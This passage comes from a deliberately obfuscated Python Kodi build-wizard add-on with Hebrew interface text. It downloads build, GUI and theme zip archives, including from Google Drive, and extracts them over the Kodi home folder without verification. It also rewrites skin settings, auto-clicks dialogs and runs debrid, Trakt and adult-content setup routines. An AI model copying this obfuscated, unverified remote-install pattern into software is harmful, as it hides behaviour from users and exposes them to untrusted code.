			OO0OOO0OOOOO00O0O =open (O0OO0OO00O0OOOOO0 ,'w')#line:3869
			OO0OOO0OOOOO00O0O .write (OOO000OO000O0OOO0 .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%O00OOOO0OO00O0OOO ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:3870
			OO0OOO0OOOOO00O0O .close ()#line:3871
		except :#line:3872
				pass #line:3873
		wiz .kodi17Fix ()#line:3874
		O0OO0OO00O0OOOOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3875
		try :#line:3876
			OO0OOO0OOOOO00O0O =open (O0OO0OO00O0OOOOO0 ,'r')#line:3877
			OOO000OO000O0OOO0 =OO0OOO0OOOOO00O0O .read ()#line:3878
			OO0OOO0OOOOO00O0O .close ()#line:3879
			OO000OOO0O0O00O00 ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:3880
			O00OOOO0OO00O0OOO =re .compile (OO000OOO0O0O00O00 ).findall (OOO000OO000O0OOO0 )[0 ]#line:3881
			OO0OOO0OOOOO00O0O =open (O0OO0OO00O0OOOOO0 ,'w')#line:3882
			OO0OOO0OOOOO00O0O .write (OOO000OO000O0OOO0 .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%O00OOOO0OO00O0OOO ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:3883
			OO0OOO0OOOOO00O0O .close ()#line:3884
		except :#line:3885
				pass #line:3886
		swapSkins ('skin.Premium.mod')#line:3887
def buildWizard (OO000O00O00OOO00O ,OOOO0O0OO00O0000O ,theme =None ,over =False ):#line:3890
	if over ==False :#line:3891
		O0OOOOO0O0OO0OOO0 =wiz .checkBuild (OO000O00O00OOO00O ,'url')#line:3892
		if O0OOOOO0O0OO0OOO0 ==False :#line:3894
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]אנא המתן...[/COLOR]'%COLOR2 )#line:3899
			xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium&url=gui)")#line:3900
			return #line:3901
		OO0OO00OOOO000OOO =wiz .workingURL (O0OOOOO0O0OO0OOO0 )#line:3902
		if OO0OO00OOOO000OOO ==False :#line:3903
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Build Zip Error: %s[/COLOR]"%(COLOR2 ,OO0OO00OOOO000OOO ))#line:3904
			return #line:3905
	if OOOO0O0OO00O0000O =='gui':#line:3906
		if OO000O00O00OOO00O ==BUILDNAME :#line:3907
			if over ==True :O0OO00OOOO0O0O000 =1 #line:3908
			else :O0OO00OOOO0O0O000 =1 #line:3909
		else :#line:3910
			O0OO00OOOO0O0O000 =1 #line:3911
		if O0OO00OOOO0O0O000 :#line:3912
			remove_addons ()#line:3913
			remove_addons2 ()#line:3914
			O0OO0OO000O0OOOO0 =wiz .checkBuild (OO000O00O00OOO00O ,'gui')#line:3915
			O0O000O00OOO0000O =OO000O00O00OOO00O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3916
			if not wiz .workingURL (O0OO0OO000O0OOOO0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3917
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3918
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO000O00O00OOO00O ),'','אנא המתן')#line:3919
			O00OOOOO0OO00OOOO =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0O000O00OOO0000O )#line:3920
			try :os .remove (O00OOOOO0OO00OOOO )#line:3921
			except :pass #line:3922
			logging .warning (O0OO0OO000O0OOOO0 )#line:3923
			if 'google'in O0OO0OO000O0OOOO0 :#line:3924
			   OOOO000O00000OOO0 =googledrive_download (O0OO0OO000O0OOOO0 ,O00OOOOO0OO00OOOO ,DP ,wiz .checkBuild (OO000O00O00OOO00O ,'filesize'))#line:3925
			else :#line:3928
			  downloader .download (O0OO0OO000O0OOOO0 ,O00OOOOO0OO00OOOO ,DP )#line:3929
			xbmc .sleep (100 )#line:3930
			O000O0O00OO0OO000 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO000O00O00OOO00O )#line:3931
			DP .update (0 ,O000O0O00OO0OO000 ,'','אנא המתן')#line:3932
			extract .all (O00OOOOO0OO00OOOO ,HOME ,DP ,title =O000O0O00OO0OO000 )#line:3933
			DP .close ()#line:3934
			wiz .defaultSkin ()#line:3935
			wiz .lookandFeelData ('save')#line:3936
			wiz .kodi17Fix ()#line:3937
			if KODIV >=18 :#line:3938
				skindialogsettind18 ()#line:3939
			xbmc .executebuiltin ("ReloadSkin()")#line:3940
			if INSTALLMETHOD ==1 :OO0OOOO0O0O000O00 =1 #line:3941
			elif INSTALLMETHOD ==2 :OO0OOOO0O0O000O00 =0 #line:3942
			else :DP .close ()#line:3943
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:3944
			update_Votes ()#line:3945
			indicatorfastupdate ()#line:3946
		else :#line:3948
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3949
	if OOOO0O0OO00O0000O =='gui2':#line:3950
		if OO000O00O00OOO00O ==BUILDNAME :#line:3951
			if over ==True :O0OO00OOOO0O0O000 =1 #line:3952
			else :O0OO00OOOO0O0O000 =1 #line:3953
		else :#line:3954
			O0OO00OOOO0O0O000 =1 #line:3955
		if O0OO00OOOO0O0O000 :#line:3956
			remove_addons ()#line:3957
			remove_addons2 ()#line:3958
			O0OO0OO000O0OOOO0 =wiz .checkBuild (OO000O00O00OOO00O ,'gui')#line:3959
			O0O000O00OOO0000O =OO000O00O00OOO00O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3960
			if not wiz .workingURL (O0OO0OO000O0OOOO0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3961
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3962
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO000O00O00OOO00O ),'','אנא המתן')#line:3963
			O00OOOOO0OO00OOOO =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0O000O00OOO0000O )#line:3964
			try :os .remove (O00OOOOO0OO00OOOO )#line:3965
			except :pass #line:3966
			logging .warning (O0OO0OO000O0OOOO0 )#line:3967
			if 'google'in O0OO0OO000O0OOOO0 :#line:3968
			   OOOO000O00000OOO0 =googledrive_download (O0OO0OO000O0OOOO0 ,O00OOOOO0OO00OOOO ,DP ,wiz .checkBuild (OO000O00O00OOO00O ,'filesize'))#line:3969
			else :#line:3972
			  downloader .download (O0OO0OO000O0OOOO0 ,O00OOOOO0OO00OOOO ,DP )#line:3973
			xbmc .sleep (100 )#line:3974
			O000O0O00OO0OO000 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO000O00O00OOO00O )#line:3975
			DP .update (0 ,O000O0O00OO0OO000 ,'','אנא המתן')#line:3976
			extract .all (O00OOOOO0OO00OOOO ,HOME ,DP ,title =O000O0O00OO0OO000 )#line:3977
			DP .close ()#line:3978
			wiz .defaultSkin ()#line:3979
			wiz .lookandFeelData ('save')#line:3980
			if INSTALLMETHOD ==1 :OO0OOOO0O0O000O00 =1 #line:3983
			elif INSTALLMETHOD ==2 :OO0OOOO0O0O000O00 =0 #line:3984
			else :DP .close ()#line:3985
		else :#line:3987
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3988
	elif OOOO0O0OO00O0000O =='fresh':#line:3989
		freshStart (OO000O00O00OOO00O )#line:3990
	elif OOOO0O0OO00O0000O =='normal':#line:3991
		if url =='normal':#line:3992
			if KEEPTRAKT =='true':#line:3993
				traktit .autoUpdate ('all')#line:3994
				wiz .setS ('traktlastsave',str (THREEDAYS ))#line:3995
			if KEEPREAL =='true':#line:3996
				debridit .autoUpdate ('all')#line:3997
				wiz .setS ('debridlastsave',str (THREEDAYS ))#line:3998
			if KEEPLOGIN =='true':#line:3999
				loginit .autoUpdate ('all')#line:4000
				wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4001
		OO0OOO00OOO00O000 =int (KODIV );OO00O00O0OOOO0OO0 =int (float (wiz .checkBuild (OO000O00O00OOO00O ,'kodi')))#line:4002
		if not OO0OOO00OOO00O000 ==OO00O00O0OOOO0OO0 :#line:4003
			if OO0OOO00OOO00O000 ==16 and OO00O00O0OOOO0OO0 <=15 :O000OOO0O0OOO0OO0 =False #line:4004
			else :O000OOO0O0OOO0OO0 =True #line:4005
		else :O000OOO0O0OOO0OO0 =False #line:4006
		if O000OOO0O0OOO0OO0 ==True :#line:4007
			OOO0O0O000O0O0OO0 =1 #line:4008
		else :#line:4009
			if not over ==False :OOO0O0O000O0O0OO0 =1 #line:4010
			else :OOO0O0O000O0O0OO0 =DIALOG .yesno (ADDONTITLE ,'התקנה רגילה:','מצב זה שומר הרחבות קיימות, האם להמשיך?',nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4011
		if OOO0O0O000O0O0OO0 :#line:4012
			wiz .clearS ('build')#line:4013
			O0OO0OO000O0OOOO0 =wiz .checkBuild (OO000O00O00OOO00O ,'url')#line:4014
			O0O000O00OOO0000O =OO000O00O00OOO00O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4015
			if not wiz .workingURL (O0OO0OO000O0OOOO0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Build Install: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4016
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4017
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO000O00O00OOO00O ,wiz .checkBuild (OO000O00O00OOO00O ,'version')),'','אנא המתן')#line:4018
			O00OOOOO0OO00OOOO =os .path .join (PACKAGES ,'%s.zip'%O0O000O00OOO0000O )#line:4019
			try :os .remove (O00OOOOO0OO00OOOO )#line:4020
			except :pass #line:4021
			logging .warning (O0OO0OO000O0OOOO0 )#line:4022
			if 'google'in O0OO0OO000O0OOOO0 :#line:4023
			   OOOO000O00000OOO0 =googledrive_download (O0OO0OO000O0OOOO0 ,O00OOOOO0OO00OOOO ,DP ,wiz .checkBuild (OO000O00O00OOO00O ,'filesize'))#line:4024
			else :#line:4027
			  downloader .download (O0OO0OO000O0OOOO0 ,O00OOOOO0OO00OOOO ,DP )#line:4028
			xbmc .sleep (1000 )#line:4029
			O000O0O00OO0OO000 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO000O00O00OOO00O ,wiz .checkBuild (OO000O00O00OOO00O ,'version'))#line:4030
			DP .update (0 ,O000O0O00OO0OO000 ,'','Please Wait')#line:4031
			O0OOOO0O0OOO0OOOO ,O000OO0OOOOO000OO ,OOO00O0OOOO0OO0OO =extract .all (O00OOOOO0OO00OOOO ,HOME ,DP ,title =O000O0O00OO0OO000 )#line:4032
			if int (float (O0OOOO0O0OOO0OOOO ))>0 :#line:4033
				try :#line:4034
					wiz .fixmetas ()#line:4035
				except :pass #line:4036
				wiz .lookandFeelData ('save')#line:4037
				wiz .defaultSkin ()#line:4038
				wiz .setS ('buildname',OO000O00O00OOO00O )#line:4040
				wiz .setS ('buildversion',wiz .checkBuild (OO000O00O00OOO00O ,'version'))#line:4041
				wiz .setS ('buildtheme','')#line:4042
				wiz .setS ('latestversion',wiz .checkBuild (OO000O00O00OOO00O ,'version'))#line:4043
				wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:4044
				wiz .setS ('installed','true')#line:4045
				wiz .setS ('extract',str (O0OOOO0O0OOO0OOOO ))#line:4046
				wiz .setS ('errors',str (O000OO0OOOOO000OO ))#line:4047
				wiz .log ('INSTALLED %s: [ERRORS:%s]'%(O0OOOO0O0OOO0OOOO ,O000OO0OOOOO000OO ))#line:4048
				fastupdatefirstbuild (NOTEID )#line:4049
				wiz .kodi17Fix ()#line:4050
				skin_homeselect ()#line:4051
				skin_lower ()#line:4052
				rdbuildinstall ()#line:4053
				try :gaiaserenaddon ()#line:4054
				except :pass #line:4055
				adults18 ()#line:4056
				skinfix18 ()#line:4057
				try :os .remove (O00OOOOO0OO00OOOO )#line:4059
				except :pass #line:4060
				OO00OO0OOO0O0O0OO =(ADDON .getSetting ("auto_rd"))#line:4061
				if OO00OO0OOO0O0O0OO =='true':#line:4062
					try :#line:4063
						setautorealdebrid ()#line:4064
					except :pass #line:4065
				try :#line:4066
					autotrakt ()#line:4067
				except :pass #line:4068
				OOOO00OO00O0O0OO0 =(ADDON .getSetting ("imdb_on"))#line:4069
				if OOOO00OO00O0O0OO0 =='true':#line:4070
					imdb_synck ()#line:4071
				iptvset ()#line:4072
				if int (float (O000OO0OOOOO000OO ))>0 :#line:4074
					O0OO00OOOO0O0O000 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO000O00O00OOO00O ,wiz .checkBuild (OO000O00O00OOO00O ,'version')),'הושלם: [COLOR %s]%s%s[/COLOR] [שגיאות:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,O0OOOO0O0OOO0OOOO ,'%',COLOR1 ,O000OO0OOOOO000OO ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4075
					if O0OO00OOOO0O0O000 :#line:4076
						if isinstance (O000OO0OOOOO000OO ,unicode ):#line:4077
							OOO00O0OOOO0OO0OO =OOO00O0OOOO0OO0OO .encode ('utf-8')#line:4078
						wiz .TextBox (ADDONTITLE ,OOO00O0OOOO0OO0OO )#line:4079
				DP .close ()#line:4080
				O0OOOO0OOO000OOOO =wiz .themeCount (OO000O00O00OOO00O )#line:4081
				builde_Votes ()#line:4082
				indicator ()#line:4083
				if not O0OOOO0OOO000OOOO ==False :#line:4084
					buildWizard (OO000O00O00OOO00O ,'theme')#line:4085
				if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4086
				if INSTALLMETHOD ==1 :OO0OOOO0O0O000O00 =1 #line:4087
				elif INSTALLMETHOD ==2 :OO0OOOO0O0O000O00 =0 #line:4088
				else :resetkodi ()#line:4089
				if OO0OOOO0O0O000O00 ==1 :wiz .reloadFix ()#line:4091
				else :wiz .killxbmc (True )#line:4092
			else :#line:4093
				if isinstance (O000OO0OOOOO000OO ,unicode ):#line:4094
					OOO00O0OOOO0OO0OO =OOO00O0OOOO0OO0OO .encode ('utf-8')#line:4095
				O0O0OOOOOO0OO00OO =open (O00OOOOO0OO00OOOO ,'r')#line:4096
				OOOO0OOOO00OOOO0O =O0O0OOOOOO0OO00OO .read ()#line:4097
				OO0OO00O0000OOOOO =''#line:4098
				for OOO00O00OOO0O00OO in OOOO000O00000OOO0 :#line:4099
				  OO0OO00O0000OOOOO ='key: '+OO0OO00O0000OOOOO +'\n'+OOO00O00OOO0O00OO #line:4100
				wiz .TextBox ("%s: בעיה בהתקנת הבילד"%ADDONTITLE ,OOO00O0OOOO0OO0OO +'לפתרון הבעיה יש לשנות את התאריך במכשיר ליום אחד קודם.'+OO0OO00O0000OOOOO )#line:4101
		else :#line:4102
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנת הבילד: מבוטלת![/COLOR]'%COLOR2 )#line:4103
	elif OOOO0O0OO00O0000O =='theme':#line:4104
		if theme ==None :#line:4105
			O0OOOO0OOO000OOOO =wiz .checkBuild (OO000O00O00OOO00O ,'theme')#line:4106
			OOO00OOO00O00O0OO =[]#line:4107
			if not O0OOOO0OOO000OOOO =='http://'and wiz .workingURL (O0OOOO0OOO000OOOO )==True :#line:4108
				OOO00OOO00O00O0OO =wiz .themeCount (OO000O00O00OOO00O ,False )#line:4109
				if len (OOO00OOO00O00O0OO )>0 :#line:4110
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The Build [COLOR %s]%s[/COLOR] comes with [COLOR %s]%s[/COLOR] different themes"%(COLOR2 ,COLOR1 ,OO000O00O00OOO00O ,COLOR1 ,len (OOO00OOO00O00O0OO )),"Would you like to install one now?[/COLOR]",yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]"):#line:4111
						wiz .log ("Theme List: %s "%str (OOO00OOO00O00O0OO ))#line:4112
						O0OO0O0O0OO00O0OO =DIALOG .select (ADDONTITLE ,OOO00OOO00O00O0OO )#line:4113
						wiz .log ("Theme install selected: %s"%O0OO0O0O0OO00O0OO )#line:4114
						if not O0OO0O0O0OO00O0OO ==-1 :theme =OOO00OOO00O00O0OO [O0OO0O0O0OO00O0OO ];O000OOOO000O00OOO =True #line:4115
						else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4116
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4117
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: None Found![/COLOR]'%COLOR2 )#line:4118
		else :O000OOOO000O00OOO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to install the theme:'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,theme ),'for [COLOR %s]%s v%s[/COLOR]?[/COLOR]'%(COLOR1 ,OO000O00O00OOO00O ,wiz .checkBuild (OO000O00O00OOO00O ,'version')),yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]")#line:4119
		if O000OOOO000O00OOO :#line:4120
			O0O0OOOO00OO0OO00 =wiz .checkTheme (OO000O00O00OOO00O ,theme ,'url')#line:4121
			O0O000O00OOO0000O =OO000O00O00OOO00O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4122
			if not wiz .workingURL (O0O0OOOO00OO0OO00 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Invalid Zip Url![/COLOR]'%COLOR2 );return False #line:4123
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4124
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme ),'','Please Wait')#line:4125
			O00OOOOO0OO00OOOO =os .path .join (PACKAGES ,'%s.zip'%O0O000O00OOO0000O )#line:4126
			try :os .remove (O00OOOOO0OO00OOOO )#line:4127
			except :pass #line:4128
			downloader .download (O0O0OOOO00OO0OO00 ,O00OOOOO0OO00OOOO ,DP )#line:4129
			xbmc .sleep (1000 )#line:4130
			DP .update (0 ,"","Installing %s "%OO000O00O00OOO00O )#line:4131
			O00000OO00000OOO0 =False #line:4132
			if url not in ["fresh","normal"]:#line:4133
				O00000OO00000OOO0 =testTheme (O00OOOOO0OO00OOOO )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4134
				OO00O0O0OOOO00O00 =testGui (O00OOOOO0OO00OOOO )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4135
				if O00000OO00000OOO0 ==True :#line:4136
					wiz .lookandFeelData ('save')#line:4137
					O000O0OOO0O00OOO0 ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4138
					O000O0OO0O00OO00O =xbmc .getSkinDir ()#line:4139
					skinSwitch .swapSkins (O000O0OOO0O00OOO0 )#line:4141
					O0O0OO00OO0000O0O =0 #line:4142
					xbmc .sleep (1000 )#line:4143
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0O0OO00OO0000O0O <150 :#line:4144
						O0O0OO00OO0000O0O +=1 #line:4145
						xbmc .sleep (1000 )#line:4146
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4147
						wiz .ebi ('SendClick(11)')#line:4148
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4149
					xbmc .sleep (1000 )#line:4150
			O000O0O00OO0OO000 ='[COLOR %s][B]Installing Theme:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme )#line:4151
			DP .update (0 ,O000O0O00OO0OO000 ,'','אנא המתן')#line:4152
			O0OOOO0O0OOO0OOOO ,O000OO0OOOOO000OO ,OOO00O0OOOO0OO0OO =extract .all (O00OOOOO0OO00OOOO ,HOME ,DP ,title =O000O0O00OO0OO000 )#line:4153
			wiz .setS ('buildtheme',theme )#line:4154
			wiz .log ('INSTALLED %s: [שגיאות:%s]'%(O0OOOO0O0OOO0OOOO ,O000OO0OOOOO000OO ))#line:4155
			DP .close ()#line:4156
			if url not in ["fresh","normal"]:#line:4157
				wiz .forceUpdate ()#line:4158
				if KODIV >=17 :wiz .kodi17Fix ()#line:4159
				if OO00O0O0OOOO00O00 ==True :#line:4160
					wiz .lookandFeelData ('save')#line:4161
					wiz .defaultSkin ()#line:4162
					O000O0OO0O00OO00O =wiz .getS ('defaultskin')#line:4163
					skinSwitch .swapSkins (O000O0OO0O00OO00O )#line:4164
					O0O0OO00OO0000O0O =0 #line:4165
					xbmc .sleep (1000 )#line:4166
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0O0OO00OO0000O0O <150 :#line:4167
						O0O0OO00OO0000O0O +=1 #line:4168
						xbmc .sleep (1000 )#line:4169
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4171
						wiz .ebi ('SendClick(11)')#line:4172
					wiz .lookandFeelData ('restore')#line:4173
				elif O00000OO00000OOO0 ==True :#line:4174
					skinSwitch .swapSkins (O000O0OO0O00OO00O )#line:4175
					O0O0OO00OO0000O0O =0 #line:4176
					xbmc .sleep (1000 )#line:4177
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0O0OO00OO0000O0O <150 :#line:4178
						O0O0OO00OO0000O0O +=1 #line:4179
						xbmc .sleep (1000 )#line:4180
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4182
						wiz .ebi ('SendClick(11)')#line:4183
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4184
					wiz .lookandFeelData ('restore')#line:4185
				else :#line:4186
					wiz .ebi ("ReloadSkin()")#line:4187
					xbmc .sleep (1000 )#line:4188
					wiz .ebi ("Container.Refresh")#line:4189
		else :#line:4190
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 )#line:4191
def skin_homeselect ():#line:4195
	try :#line:4197
		OOOOOOO0000OOOOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4198
		O0O00OO000000000O =open (OOOOOOO0000OOOOO0 ,'r')#line:4200
		OO000OOO00O0O0OO0 =O0O00OO000000000O .read ()#line:4201
		O0O00OO000000000O .close ()#line:4202
		O0OOO00OOO00O0O0O ='<setting id="HomeS" type="string(.+?)/setting>'#line:4203
		OOOO0000O00O000OO =re .compile (O0OOO00OOO00O0O0O ).findall (OO000OOO00O0O0OO0 )[0 ]#line:4204
		O0O00OO000000000O =open (OOOOOOO0000OOOOO0 ,'w')#line:4205
		O0O00OO000000000O .write (OO000OOO00O0O0OO0 .replace ('<setting id="HomeS" type="string%s/setting>'%OOOO0000O00O000OO ,'<setting id="HomeS" type="string"></setting>'))#line:4206
		O0O00OO000000000O .close ()#line:4207
	except :#line:4208
		pass #line:4209
def skin_lower ():#line:4212
	O00OOO00O00OO00OO =(ADDON .getSetting ("lower"))#line:4213
	if O00OOO00O00OO00OO =='true':#line:4214
		try :#line:4217
			O0O0000O000OOO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4218
			OOOO000000O00OOO0 =open (O0O0000O000OOO000 ,'r')#line:4220
			O0OOOO00OO0OOOO0O =OOOO000000O00OOO0 .read ()#line:4221
			OOOO000000O00OOO0 .close ()#line:4222
			OOO0OOO0000O000O0 ='<setting id="none_widget" type="bool(.+?)/setting>'#line:4223
			O00O0O0OOOOO0OOOO =re .compile (OOO0OOO0000O000O0 ).findall (O0OOOO00OO0OOOO0O )[0 ]#line:4224
			OOOO000000O00OOO0 =open (O0O0000O000OOO000 ,'w')#line:4225
			OOOO000000O00OOO0 .write (O0OOOO00OO0OOOO0O .replace ('<setting id="none_widget" type="bool%s/setting>'%O00O0O0OOOOO0OOOO ,'<setting id="none_widget" type="bool">true</setting>'))#line:4226
			OOOO000000O00OOO0 .close ()#line:4227
			O0O0000O000OOO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4229
			OOOO000000O00OOO0 =open (O0O0000O000OOO000 ,'r')#line:4231
			O0OOOO00OO0OOOO0O =OOOO000000O00OOO0 .read ()#line:4232
			OOOO000000O00OOO0 .close ()#line:4233
			OOO0OOO0000O000O0 ='<setting id="DisableOverlayColor" type="bool(.+?)/setting>'#line:4234
			O00O0O0OOOOO0OOOO =re .compile (OOO0OOO0000O000O0 ).findall (O0OOOO00OO0OOOO0O )[0 ]#line:4235
			OOOO000000O00OOO0 =open (O0O0000O000OOO000 ,'w')#line:4236
			OOOO000000O00OOO0 .write (O0OOOO00OO0OOOO0O .replace ('<setting id="DisableOverlayColor" type="bool%s/setting>'%O00O0O0OOOOO0OOOO ,'<setting id="DisableOverlayColor" type="bool">true</setting>'))#line:4237
			OOOO000000O00OOO0 .close ()#line:4238
			O0O0000O000OOO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4240
			OOOO000000O00OOO0 =open (O0O0000O000OOO000 ,'r')#line:4242
			O0OOOO00OO0OOOO0O =OOOO000000O00OOO0 .read ()#line:4243
			OOOO000000O00OOO0 .close ()#line:4244
			OOO0OOO0000O000O0 ='<setting id="backgroundwallpaper" type="bool(.+?)/setting>'#line:4245
			O00O0O0OOOOO0OOOO =re .compile (OOO0OOO0000O000O0 ).findall (O0OOOO00OO0OOOO0O )[0 ]#line:4246
			OOOO000000O00OOO0 =open (O0O0000O000OOO000 ,'w')#line:4247
			OOOO000000O00OOO0 .write (O0OOOO00OO0OOOO0O .replace ('<setting id="backgroundwallpaper" type="bool%s/setting>'%O00O0O0OOOOO0OOOO ,'<setting id="backgroundwallpaper" type="bool">true</setting>'))#line:4248
			OOOO000000O00OOO0 .close ()#line:4249
			O0O0000O000OOO000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4253
			OOOO000000O00OOO0 =open (O0O0000O000OOO000 ,'r')#line:4255
			O0OOOO00OO0OOOO0O =OOOO000000O00OOO0 .read ()#line:4256
			OOOO000000O00OOO0 .close ()#line:4257
			OOO0OOO0000O000O0 ='<setting id="show.clearlogo" type="bool(.+?)/setting>'#line:4258
			O00O0O0OOOOO0OOOO =re .compile (OOO0OOO0000O000O0 ).findall (O0OOOO00OO0OOOO0O )[0 ]#line:4259
			OOOO000000O00OOO0 =open (O0O0000O000OOO000 ,'w')#line:4260
